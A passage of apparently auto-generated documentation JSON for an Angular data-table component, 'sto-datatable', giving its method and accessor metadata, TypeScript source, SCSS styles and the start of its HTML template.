              {
                "name": "smallScreen",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "boolean",
                "optional": false,
                "description": "",
                "line": 194,
                "modifierKind": [
                  123
                ]
              }
            ],
            "methodsClass": [
                {
                    "name": "defaultSortFn",
                    "args": [
                      {
                        "name": "a",
                        "type": "T",
                        "deprecated": false,
                        "deprecationMessage": ""
                      },
                      {
                        "name": "b",
                        "type": "T",
                        "deprecated": false,
                        "deprecationMessage": ""
                      },
                      {
                        "name": "col",
                        "type": "Column",
                        "deprecated": false,
                        "deprecationMessage": ""
                      }
                    ],
                  "optional": false,
                  "returnType": "any",
                  "typeParameters": [],
                  "line": 348,
                  "deprecated": false,
                  "deprecationMessage": "",
                  "modifierKind": [
                    121
                  ],
                  "jsdoctags": [
                    {
                      "name": "a",
                      "type": "T",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "tagName": {
                        "text": "param"
                      }
                    },
                    {
                      "name": "b",
                      "type": "T",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "tagName": {
                        "text": "param"
                      }
                    },
                    {
                      "name": "col",
                      "type": "Column",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "tagName": {
                        "text": "param"
                      }
                    }
                  ]
                },
              {
                "name": "ngAfterViewInit",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 247,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "ngOnDestroy",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 282,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "onResize",
                "args": [
                  {
                    "type": "literal type",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 365,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "type": "literal type",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "rowClick",
                "args": [
                  {
                    "name": "row",
                    "type": "T",
                    "deprecated": false,
                    "deprecationMessage": ""
                  },
                  {
                    "name": "index",
                    "type": "number",
                    "deprecated": false,
                    "deprecationMessage": ""
                  },
                  {
                    "name": "event",
                    "type": "MouseEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 238,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "row",
                    "type": "T",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  },
                  {
                    "name": "index",
                    "type": "number",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  },
                  {
                    "name": "event",
                    "type": "MouseEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "scrollBodyAndHeader",
                "args": [
                  {
                    "name": "event",
                    "type": "Event",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 326,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "event",
                    "type": "Event",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "scrollTo",
                "args": [
                  {
                    "name": "item",
                    "type": "T | number",
                    "deprecated": false,
                    "deprecationMessage": ""
                  },
                  {
                    "name": "behaviour",
                    "type": "ScrollBehavior",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "defaultValue": "'smooth'"
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 294,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  123
                ],
                "jsdoctags": [
                  {
                    "name": "item",
                    "type": "T | number",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  },
                  {
                    "name": "behaviour",
                    "type": "ScrollBehavior",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "defaultValue": "'smooth'",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
                {
                    "name": "scrollToIndex",
                    "args": [
                      {
                        "name": "index",
                        "type": "number",
                        "deprecated": false,
                        "deprecationMessage": ""
                      },
                      {
                        "name": "behaviour",
                        "type": "ScrollBehavior",
                        "deprecated": false,
                        "deprecationMessage": ""
                      }
                    ],
                  "optional": false,
                  "returnType": "void",
                  "typeParameters": [],
                  "line": 288,
                  "deprecated": false,
                  "deprecationMessage": "",
                  "modifierKind": [
                    121
                  ],
                  "jsdoctags": [
                    {
                      "name": "index",
                      "type": "number",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "tagName": {
                        "text": "param"
                      }
                    },
                    {
                      "name": "behaviour",
                      "type": "ScrollBehavior",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "tagName": {
                        "text": "param"
                      }
                    }
                  ]
                },
              {
                "name": "setAutoSize",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 307,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "setHeaderScroll",
                "args": [
                  {
                    "name": "event",
                    "type": "Event",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 320,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "event",
                    "type": "Event",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "sort",
                "args": [
                  {
                    "type": "literal type",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 331,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "type": "literal type",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "trackColumnsFn",
                "args": [
                  {
                    "name": "index",
                    "type": "number",
                    "deprecated": false,
                    "deprecationMessage": ""
                  },
                  {
                    "name": "item",
                    "type": "Column",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "any",
                "typeParameters": [],
                "line": 243,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "index",
                    "type": "number",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  },
                  {
                    "name": "item",
                    "type": "Column",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              }
            ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import {\r\n  AfterViewInit,\r\n  ChangeDetectionStrategy,\r\n  ChangeDetectorRef,\r\n  Component,\r\n  ContentChild,\r\n  ElementRef,\r\n  EventEmitter,\r\n  HostBinding,\r\n  Input,\r\n  OnDestroy,\r\n  Output,\r\n  TemplateRef,\r\n  ViewChild,\r\n  ViewEncapsulation\r\n} from '@angular/core';\r\nimport { Column, ColumnDisplay, ColumnGroup } from './columns';\r\nimport { HeaderContextMenu, RowActivation, RowContextMenu, RowSelection } from './events';\r\nimport { StoDatatableBodyComponent } from './sto-datatable-body/sto-datatable-body.component';\r\nimport { fromEvent, Observable, of } from 'rxjs';\r\nimport { debounceTime, map, startWith, tap } from 'rxjs/operators';\r\nimport { SelectionModes } from './selection-modes';\r\nimport { rowClassFn, SortColumn } from './models';\r\nimport { StoDatatableActionsComponent } from './sto-datatable-actions/sto-datatable-actions.component';\r\n\r\n@Component({\r\n  selector: 'sto-datatable',\r\n  templateUrl: './sto-datatable.component.html',\r\n  styleUrls: [ './sto-datatable.component.scss', './sto-datatable-progress-bar.scss' ],\r\n  encapsulation: ViewEncapsulation.None,\r\n  changeDetection: ChangeDetectionStrategy.OnPush,\r\n})\r\nexport class StoDatatableComponent<T extends Record<string, unknown>> implements AfterViewInit, OnDestroy {\r\n\r\n  @Input()\r\n  get height() {\r\n    return this._height;\r\n  }\r\n\r\n  set height(height: number) {\r\n    this._height = height;\r\n    if ( !this.autoSize ) {\r\n      this.height$ = of(height);\r\n    }\r\n  }\r\n\r\n  get bodyHeight() {\r\n    if ( !this.height || !this.body ) {\r\n      return null;\r\n    }\r\n    const hasHeader = !this.responsive || ( this.responsive && !this.smallScreen );\r\n    const hasFooter = this.footerRow && ( !this.responsive || ( this.responsive && !this.smallScreen ) );\r\n    const hasHeaderGroup = ( !this.responsive || ( this.responsive && !this.smallScreen ) ) && this.columnGroups;\r\n    const headerOffset = hasHeader ? this.headerHeight : 0;\r\n    const actionsHeight = this.actions ? this.actions.height : 0;\r\n    let footerOffset = 0;\r\n    if ( hasFooter && this.footerRow instanceof Array ) {\r\n      footerOffset = this.rowHeight * this.footerRow.length;\r\n    } else if ( hasFooter ) {\r\n      footerOffset = this.rowHeight;\r\n    }\r\n    const groupOffset = hasHeaderGroup ? this.headerHeight : 0;\r\n    return this.height - headerOffset - footerOffset - groupOffset - actionsHeight;\r\n  }\r\n\r\n  @Input()\r\n  set rows(rows: T[]) {\r\n    this._rows = rows;\r\n    let sortedRows = [...(rows || [])];\r\n    if (!this.preserveSort) {\r\n      this.activeSort = null;\r\n    }\r\n\r\n    if (this.activeSort) {\r\n      const column = this.columns.find(col => col.$$id === this.activeSort?.id);\r\n      const sortDir = this.activeSort.sortDir;\r\n      if (column) {\r\n          const fn = column.sortFn || this.defaultSortFn;\r\n          sortedRows = [ ...rows ].sort((a, b) => fn(a, b, column));\r\n        if ( sortDir === 'desc' ) {\r\n          sortedRows.reverse();\r\n        }\r\n      }\r\n    }\r\n\r\n    this.rowTotalHeight = ( rows || [] ).length * this.rowHeight;\r\n    this._internalRows = [...( sortedRows || [] )];\r\n  }\r\n\r\n  get rows() {\r\n    return this._internalRows;\r\n  }\r\n\r\n  @Input('footerRow')\r\n  get footerRow() {\r\n    if ( this._footerRow && typeof this._footerRow === 'object' ) {\r\n      if ( this._footerRow instanceof Array ) {\r\n        return this._footerRow;\r\n      }\r\n      return [ this._footerRow ];\r\n    }\r\n  }\r\n\r\n  // eslint-disable-next-line @typescript-eslint/no-explicit-any\r\n  set footerRow(row: any) {\r\n    this._footerRow = row;\r\n  }\r\n\r\n  @Input()\r\n  get columnMode(): ColumnDisplay {\r\n    return this._columnMode || ColumnDisplay.Flex;\r\n  }\r\n\r\n  set columnMode(columnMode: ColumnDisplay) {\r\n    this._columnMode = columnMode;\r\n  }\r\n\r\n  @Input()\r\n  get columns(): Column[] {\r\n    return this._columns;\r\n  }\r\n\r\n  set columns(columns: Column[]) {\r\n    if ( columns ) {\r\n      this._columns = columns\r\n        .map((column, index) => ( {\r\n          ...column,\r\n          $$id: btoa(`${column.prop}${column.name}${index}`)\r\n        } ));\r\n      this.columnTotalWidth = columns.map(c => c.flexBasis || 80).reduce((a, b) => a + b, 0);\r\n    }\r\n  }\r\n\r\n  get width() {\r\n    if ( this.scrollbarH && this.columns ) {\r\n      const widthOffset = this.bodyHeight && this.rowTotalHeight > this.bodyHeight ? 12 : 0;\r\n      return `${this.columnTotalWidth + widthOffset}px`;\r\n    }\r\n    return 'auto';\r\n  }\r\n\r\n  @ViewChild(StoDatatableBodyComponent)\r\n  body: StoDatatableBodyComponent<T>;\r\n  @ContentChild(StoDatatableActionsComponent)\r\n  actions: StoDatatableActionsComponent;\r\n  @Input()\r\n  rowHeight = 36;\r\n  @Input()\r\n  scrollbarH: boolean;\r\n  @Input()\r\n  emptyMessage = `No records in set`;\r\n  @Input()\r\n  headerHeight = 24;\r\n  @Input()\r\n  selectionMode: SelectionModes = SelectionModes.Click;\r\n  @Input()\r\n  sortable: boolean;\r\n  @Input()\r\n  disableRipple: boolean;\r\n\r\n  ColumnDisplay = ColumnDisplay;\r\n\r\n  private _height: number;\r\n  @Input()\r\n  loading: boolean;\r\n  public height$: Observable<number>;\r\n  public rowTotalHeight: number;\r\n\r\n  @Input()\r\n  autoSize: boolean;\r\n  @Input()\r\n  autoSizeOffset = 0;\r\n  @Input()\r\n  preserveSort: boolean;\r\n\r\n  private _rows: T[];\r\n  private _internalRows: T[];\r\n  @Input()\r\n  selected: T;\r\n\r\n  private _footerRow: T;\r\n\r\n  @Input()\r\n  virtualScroll = true;\r\n\r\n  private _columnMode: ColumnDisplay;\r\n\r\n  @Input()\r\n  responsive: boolean;\r\n  @Input()\r\n  responsiveView: TemplateRef<unknown>;\r\n  @Input()\r\n  responsiveBreakPoint = 400;\r\n  public smallScreen: boolean;\r\n\r\n  @Input()\r\n  rowClass: rowClassFn;\r\n\r\n  @HostBinding('class.mat-elevation-z3')\r\n  @Input()\r\n  elevation = true;\r\n\r\n  @Input()\r\n  columnGroups: ColumnGroup[];\r\n\r\n  private _columns: Column[];\r\n  @Output()\r\n    // eslint-disable-next-line @angular-eslint/no-output-native\r\n  select = new EventEmitter<RowSelection<T>>();\r\n  @Output()\r\n  resized = new EventEmitter<Column>();\r\n  @Output()\r\n  rowContextMenu = new EventEmitter<RowContextMenu<T>>();\r\n  @Output()\r\n  headerContextMenu = new EventEmitter<HeaderContextMenu>();\r\n  @Output()\r\n  rowActivate = new EventEmitter<RowActivation<T>>();\r\n  @Input()\r\n  resizeable: boolean;\r\n\r\n  private resizeTimeout: number | undefined;\r\n  public columnTotalWidth: number;\r\n\r\n  public scrollLeft = 'translate3d(0px, 0px, 0px)';\r\n  public scrollNum: number;\r\n  public activeSort: SortColumn | null;\r\n\r\n  constructor(private elRef: ElementRef, private cdr: ChangeDetectorRef) {\r\n  }\r\n\r\n\r\n  @Input()\r\n    // eslint-disable-next-line @typescript-eslint/no-unused-vars\r\n  trackBy = (index: number, item: T) => {\r\n    return index;\r\n  };\r\n\r\n  rowClick(row: T, index: number, event: MouseEvent) {\r\n    this.selected = row;\r\n    this.select.emit({ row, index, event });\r\n  }\r\n\r\n  trackColumnsFn(index: number, item: Column) {\r\n    return item.$$id;\r\n  }\r\n\r\n  ngAfterViewInit() {\r\n    if ( this.autoSize ) {\r\n      this.setAutoSize();\r\n    }\r\n    if ( this.responsive && !this.responsiveView ) {\r\n      console.error('Responsive mode set to true, but no view passed in. Please pass in responsiveView (templateRef)');\r\n      this.responsive = false;\r\n    } else if ( this.responsive ) {\r\n      new ResizeObserver(entries => {\r\n        if ( this.resizeTimeout ) {\r\n          clearTimeout(this.resizeTimeout);\r\n        }\r\n        // eslint-disable-next-line @typescript-eslint/ban-ts-comment\r\n        // @ts-ignore\r\n        this.resizeTimeout = setTimeout(() => {\r\n          for ( const entry of entries ) {\r\n            const cr = entry.contentRect;\r\n            const { width } = cr;\r\n            const smallScreen = width < this.responsiveBreakPoint;\r\n            if ( this.smallScreen !== smallScreen ) {\r\n              this.smallScreen = smallScreen;\r\n              requestAnimationFrame(() => {\r\n                try {\r\n                  this.cdr.markForCheck();\r\n                  this.cdr.detectChanges();\r\n                } catch { /** them all */\r\n                }\r\n              });\r\n            }\r\n          }\r\n        }, 15);\r\n      }).observe(this.elRef.nativeElement);\r\n    }\r\n  }\r\n\r\n  ngOnDestroy(): void {\r\n    if ( this.resizeTimeout ) {\r\n      clearTimeout(this.resizeTimeout);\r\n    }\r\n  }\r\n\r\n  private scrollToIndex(index: number, behaviour: ScrollBehavior) {\r\n    if ( this.body.vScroller ) {\r\n      this.body.vScroller.scrollToIndex(index, behaviour);\r\n    }\r\n  }\r\n\r\n  public scrollTo(item: T | number, behaviour: ScrollBehavior = 'smooth') {\r\n    if ( this.body.vScroller ) {\r\n      if ( typeof item === 'number' ) {\r\n        this.scrollToIndex(item, behaviour);\r\n      } else {\r\n        const index = this.rows.indexOf(item);\r\n        if ( index >= 0 ) {\r\n          this.scrollToIndex(index, behaviour);\r\n        }\r\n      }\r\n    }\r\n  }\r\n\r\n  private setAutoSize() {\r\n    const el = this.elRef.nativeElement as HTMLElement;\r\n    this.height$ = fromEvent(window, 'resize')\r\n      .pipe(\r\n        startWith(null),\r\n        debounceTime(20), // ~1 animation frame\r\n        map(() => el.getBoundingClientRect()),\r\n        map(rect => rect.top),\r\n        map(top => window.innerHeight - top - 16 - this.autoSizeOffset - ( this.actions ? 6 : 0 )),\r\n        tap(height => this.height = height)\r\n      );\r\n  }\r\n\r\n  setHeaderScroll(event: Event) {\r\n    const left = (event.target as HTMLElement).scrollLeft;\r\n    this.scrollLeft = `translate3d(-${left}px, 0px, 0px)`;\r\n    this.cdr.detectChanges();\r\n  }\r\n\r\n  scrollBodyAndHeader(event: Event) {\r\n    const left = (event.target as HTMLElement).scrollLeft;\r\n    this.scrollLeft = `translate3d(-${left}px, 0px, 0px)`;\r\n  }\r\n\r\n  sort({ column, sortDir }: { column: Column, sortDir: 'asc' | 'desc' | null }) {\r\n    if ( sortDir === null ) {\r\n      this._internalRows = [ ...this._rows ];\r\n      this.activeSort = null;\r\n      return;\r\n    }\r\n    this.activeSort = { id: column.$$id || '', sortDir };\r\n    const fn = column.sortFn || this.defaultSortFn;\r\n    const rows = [ ...this._rows ].sort((a, b) => fn(a, b, column));\r\n    if ( sortDir === 'desc' ) {\r\n      rows.reverse();\r\n    }\r\n    this._internalRows = rows;\r\n    this.cdr.detectChanges();\r\n    this.cdr.markForCheck();\r\n  }\r\n\r\n  private defaultSortFn(a: T, b: T, col: Column) {\r\n    // eslint-disable-next-line @typescript-eslint/ban-ts-comment\r\n    // @ts-ignore\r\n    const aValue = a[ col.prop ];\r\n    // eslint-disable-next-line @typescript-eslint/ban-ts-comment\r\n    // @ts-ignore\r\n    const bValue = b[ col.prop ];\r\n    switch ( typeof aValue ) {\r\n      case 'string':\r\n        return aValue.localeCompare(bValue as string);\r\n      case 'number':\r\n        return aValue - (bValue as number);\r\n      default:\r\n        return 0;\r\n    }\r\n  }\r\n\r\n  onResize({ columns, column }: { columns: Column[], column: Column }) {\r\n    this.columns = [ ...columns ]\r\n      .map(c => {\r\n        // Disallow grow/shrink if resizing\r\n        c.flexGrow = 0;\r\n        c.flexShrink = 0;\r\n        return c;\r\n      });\r\n    this.resized.emit(column);\r\n  }\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": "@import \"./sto-datatable-mixins\";\r\n\r\n$space: 4px;\r\n$space-2x: $space * 2;\r\n\r\n$datatable-header-vertical-padding: $space-2x;\r\n$datatable-header-horizontal-padding: $space-2x;\r\n$datatable-header-font-size: 11px;\r\n$datatable-vertical-padding: $space-2x;\r\n$datatable-horizontal-padding: $space-2x;\r\n\r\n$content-height: 20px;\r\n\r\n.sto-mdl-table {\r\n  transition: height 225ms cubic-bezier(0.4, 0.0, 0.2, 1);\r\n  position: relative;\r\n  width: 100%;\r\n  border-collapse: collapse;\r\n  white-space: nowrap;\r\n\r\n  &__row--scroll-offset {\r\n    padding-right: 12px;\r\n  }\r\n\r\n  &__actions {\r\n    display: flex;\r\n    align-items: center;\r\n    justify-content: space-between;\r\n\r\n    &__left {\r\n      display: flex;\r\n      flex: 1 1 auto;\r\n    }\r\n\r\n    &__right {\r\n      display: flex;\r\n      flex: 1 1 auto;\r\n      justify-content: flex-end;\r\n    }\r\n  }\r\n\r\n  &__header {\r\n    &__row {\r\n      display: flex;\r\n      align-items: center;\r\n\r\n      &__cell {\r\n        height: 100%;\r\n        font-weight: 400;\r\n        flex: 1 0 50px;\r\n        overflow: hidden;\r\n        text-align: left;\r\n        padding: 0 $datatable-horizontal-padding;\r\n        position: relative;\r\n        vertical-align: bottom;\r\n        text-overflow: ellipsis;\r\n        box-sizing: border-box;\r\n\r\n        &__content {\r\n          flex: 1 1 auto;\r\n        }\r\n\r\n        &__resize-handle {\r\n          flex: 0 0 9px;\r\n          visibility: hidden;\r\n          cursor: col-resize;\r\n          position: relative;\r\n        }\r\n\r\n        &:hover &__resize-handle {\r\n          visibility: visible;\r\n        }\r\n      }\r\n    }\r\n  }\r\n\r\n  &__header-group {\r\n    &__cell {\r\n      position: absolute;\r\n      overflow: hidden;\r\n    }\r\n  }\r\n\r\n  &__body {\r\n    &--scrollbar-h {\r\n      .cdk-virtual-scroll-content-wrapper {\r\n        width: fit-content;\r\n      }\r\n    }\r\n  }\r\n\r\n  &__body, &__footer {\r\n    &--selectable &__row {\r\n      cursor: pointer;\r\n    }\r\n\r\n    &__row {\r\n      display: flex;\r\n      position: relative;\r\n      align-items: center;\r\n      outline: none;\r\n\r\n      &--selected {\r\n        box-shadow: -1px 1px 0px 0px rgba(0, 0, 0, .26) inset, 1px -1px 0px 0 rgba(0, 0, 0, .26) inset\r\n      }\r\n\r\n\r\n      &__cell {\r\n        flex: 1 0 50px;\r\n        overflow: hidden;\r\n        text-align: left;\r\n        padding: 0 $datatable-horizontal-padding;\r\n        position: relative;\r\n        vertical-align: middle;\r\n        box-sizing: border-box;\r\n        transition: flex-basis 100ms linear;\r\n\r\n        span {\r\n          overflow: hidden;\r\n          white-space: nowrap;\r\n          text-overflow: ellipsis;\r\n          display: block;\r\n        }\r\n      }\r\n    }\r\n  }\r\n\r\n  &__body--empty {\r\n    margin: 8px;\r\n  }\r\n\r\n  &__body--no-vscroll {\r\n    overflow-y: auto;\r\n  }\r\n}\r\n\r\n\r\nsto-datatable {\r\n  display: block;\r\n}\r\n\r\nsto-datatable .cdk-virtual-scroll-content-wrapper {\r\n  position: static;\r\n}\r\n\r\n.sto-card.sto-card--table {\r\n  sto-datatable {\r\n    margin: 0 -8px;\r\n\r\n    .sto-mdl-table__header__row__cell, .sto-mdl-table__body__row__cell, .sto-mdl-table__footer__row__cell {\r\n      &:first-of-type {\r\n        margin-left: 8px;\r\n      }\r\n\r\n      &:last-of-type {\r\n        margin-right: 8px;\r\n      }\r\n    }\r\n  }\r\n}\r\n\r\n\r\n",
            "styleUrl": "./sto-datatable.component.scss"
          },
          {
            "data": ".sto-mdl-table {\r\n  &__progress-bar {\r\n    display: block;\r\n    width: 100%;\r\n    height: 5px;\r\n    padding: 0;\r\n    margin: -5px 0 0 0;\r\n    position: absolute;\r\n\r\n    &__container {\r\n      display: block;\r\n      position: relative;\r\n      overflow: hidden;\r\n      width: 100%;\r\n      height: 5px;\r\n      -webkit-transform: translate(0, 0) scale(1, 1);\r\n      transform: translate(0, 0) scale(1, 1);\r\n      background-color: rgb(170, 209, 249);\r\n\r\n      &__bar {\r\n        transition: all .2s linear;\r\n        -webkit-animation: query .8s infinite cubic-bezier(.39, .575, .565, 1);\r\n        animation: query .8s infinite cubic-bezier(.39, .575, .565, 1);\r\n\r\n        transition: -webkit-transform .2s linear;\r\n        transition: transform .2s linear;\r\n        background-color: rgb(16, 108, 200);\r\n\r\n        position: absolute;\r\n        left: 0;\r\n        top: 0;\r\n        bottom: 0;\r\n        width: 100%;\r\n        height: 5px;\r\n      }\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Progress bar animations\r\n   */\r\n  @keyframes query {\r\n    0% {\r\n      opacity: 1;\r\n      transform: translateX(35%) scale(.3, 1);\r\n    }\r\n\r\n    100% {\r\n      opacity: 0;\r\n      transform: translateX(-50%) scale(0, 1);\r\n    }\r\n  }\r\n\r\n}\r\n",
            "styleUrl": "./sto-datatable-progress-bar.scss"
          }
        ],
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "elRef",
              "type": "ElementRef",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "cdr",
              "type": "ChangeDetectorRef",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 226,
          "jsdoctags": [
            {
              "name": "elRef",
              "type": "ElementRef",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "cdr",
              "type": "ChangeDetectorRef",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "implements": [
          "AfterViewInit",
          "OnDestroy"
        ],
        "accessors": {
          "height": {
            "name": "height",
            "setSignature": {
              "name": "height",
              "type": "void",
              "deprecated": false,
              "deprecationMessage": "",
              "args": [
                {
                  "name": "height",
                  "type": "number",
                  "deprecated": false,
                  "deprecationMessage": ""
                }
              ],
              "returnType": "void",
              "line": 40,
              "jsdoctags": [
                {
                  "name": "height",
                  "type": "number",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                }
              ]
            },
            "getSignature": {
              "name": "height",
              "type": "",
              "returnType": "",
              "line": 36
            }
          },
                "bodyHeight": {
                    "name": "bodyHeight",
                    "getSignature": {
                        "name": "bodyHeight",
                        "type": "",
                        "returnType": "",
                        "line": 47
                    }
                },
                "rows": {
                    "name": "rows",
                    "setSignature": {
                      "name": "rows",
                      "type": "void",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "args": [
                        {
                          "name": "rows",
                          "type": "T[]",
                          "deprecated": false,
                          "deprecationMessage": ""
                        }
                      ],
                      "returnType": "void",
                      "line": 67,
                      "jsdoctags": [
                        {
                          "name": "rows",
                          "type": "T[]",
                          "deprecated": false,
                          "deprecationMessage": "",
                          "tagName": {
                            "text": "param"
                          }
                        }
                      ]
                    },
                    "getSignature": {
                        "name": "rows",
                        "type": "",
                        "returnType": "",
                        "line": 90
                    }
                },
                "footerRow": {
                    "name": "footerRow",
                    "setSignature": {
                      "name": "footerRow",
                      "type": "void",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "args": [
                        {
                          "name": "row",
                          "type": "any",
                          "deprecated": false,
                          "deprecationMessage": ""
                        }
                      ],
                      "returnType": "void",
                      "line": 105,
                      "jsdoctags": [
                        {
                          "name": "row",
                          "type": "any",
                          "deprecated": false,
                          "deprecationMessage": "",
                          "tagName": {
                            "text": "param"
                          }
                        }
                      ]
                    },
                  "getSignature": {
                    "name": "footerRow",
                    "type": "",
                    "returnType": "",
                    "line": 95
                  }
                },
                "columnMode": {
                    "name": "columnMode",
                    "setSignature": {
                      "name": "columnMode",
                      "type": "void",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "args": [
                        {
                          "name": "columnMode",
                          "type": "ColumnDisplay",
                          "deprecated": false,
                          "deprecationMessage": ""
                        }
                      ],
                      "returnType": "void",
                      "line": 114,
                      "jsdoctags": [
                        {
                          "name": "columnMode",
                          "type": "ColumnDisplay",
                          "deprecated": false,
                          "deprecationMessage": "",
                          "tagName": {
                            "text": "param"
                          }
                        }
                      ]
                    },
                  "getSignature": {
                    "name": "columnMode",
                    "type": "",
                    "returnType": "ColumnDisplay",
                    "line": 110
                  }
                },
                "columns": {
                    "name": "columns",
                    "setSignature": {
                      "name": "columns",
                      "type": "void",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "args": [
                        {
                          "name": "columns",
                          "type": "Column[]",
                          "deprecated": false,
                          "deprecationMessage": ""
                        }
                      ],
                      "returnType": "void",
                      "line": 123,
                      "jsdoctags": [
                        {
                          "name": "columns",
                          "type": "Column[]",
                          "deprecated": false,
                          "deprecationMessage": "",
                          "tagName": {
                            "text": "param"
                          }
                        }
                      ]
                    },
                  "getSignature": {
                    "name": "columns",
                    "type": "[]",
                    "returnType": "Column[]",
                    "line": 119
                  }
                },
          "width": {
            "name": "width",
            "getSignature": {
              "name": "width",
              "type": "",
              "returnType": "",
              "line": 134
            }
          }
        },
        "templateData": "<div class=\"sto-mdl-table\"\r\n     [class.sto-mdl-table--force-width]=\"columnMode === ColumnDisplay.Force\"\r\n     [style.height.px]=\"height$ | async\">\r\n  <ng-content select=\"sto-datatable-actions\"></ng-content>\r\n  <sto-datatable-header-group *ngIf=\"(!responsive || (responsive && !smallScreen)) && columnGroups && this.scrollbarH\"\r\n                              [width]=\"width\"\r\n                              [height]=\"headerHeight\"\r\n                              [transform]=\"scrollLeft\"\r\n                              [columns]=\"columns\"\r\n                              [groups]=\"columnGroups\"></sto-datatable-header-group>\r\n  <sto-datatable-header [responsive]=\"responsive\"\r\n                        [columnMode]=\"columnMode\"\r\n                        (resized)=\"onResize($event)\"\r\n                        [resizeable]=\"resizeable && scrollbarH\"\r\n                        [smallScreen]=\"smallScreen\"\r\n                        [headerHeight]=\"headerHeight\"\r\n                        [offset]=\"bodyHeight && rowTotalHeight > bodyHeight ? 12 : 0\"\r\n                        [width]=\"width\"\r\n                        [scrollLeft]=\"scrollLeft\"\r\n                        [bodyHeight]=\"bodyHeight\"\r\n                        [rows]=\"rows\"\r\n                        [rowHeight]=\"rowHeight\"\r\n                        [columns]=\"columns\"\r\n                        [activeSortId]=\"activeSort?.id\"\r\n                        [sortable]=\"sortable\"\r\n                        (sort)=\"sort($event)\"\r\n                        (headerContextMenu)=\"headerContextMenu.emit($event)\"></sto-datatable-header>\r\n  <div class=\"sto-mdl-table__progress-bar\"\r\n       *ngIf=\"loading\"\r\n       role=\"progressbar\">\r\n    <div class=\"sto-mdl-table__progress-bar__container\">\r\n      <div class=\"sto-mdl-table__progress-bar__container__bar\"></div>\r\n    </div>\r\n  </div>\r\n  <div class=\"sto-mdl-table__body--empty\"\r\n       *ngIf=\"!rows || rows.length === 0\">\r\n    {{ emptyMessage }}\r\n  </div>\r\n  <sto-datatable-body #body\r\n                      [disableRipple]=\"disableRipple || select.observers.length === 0\"\r\n                      [columnMode]=\"columnMode\"\r\n                      [width]=\"scrollbarH ? columnTotalWidth + 'px' : 'auto'\"\r\n                      [selectable]=\"!!select.observers.length\"\r\n                      [rows]=\"rows\"\r\n                      